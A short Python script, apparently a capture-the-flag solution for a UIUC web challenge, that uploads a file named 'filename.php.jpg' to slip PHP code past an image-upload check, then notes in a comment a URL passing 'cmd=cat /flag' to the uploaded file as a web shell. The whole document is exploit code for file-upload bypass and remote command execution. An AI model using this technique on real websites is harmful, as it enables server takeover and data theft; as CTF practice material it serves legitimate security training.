import io
import requests

URL="https://frame-web.chal.uiuc.tf/"

r = requests.Session()

filename="filename.php.jpg"
template=b"phpinfo();"
filehandle=io.BytesIO(template)

files={
    'fileToUpload': (filename, filehandle)
}

data={
    "submit": "Upload Image"
}

res = r.post(URL, files=files, data=data)
print(res.text)

# https://frame-web.chal.uiuc.tf/uploads/8fddcd4364a6db09-output.php.gif?cmd=cat%20/flag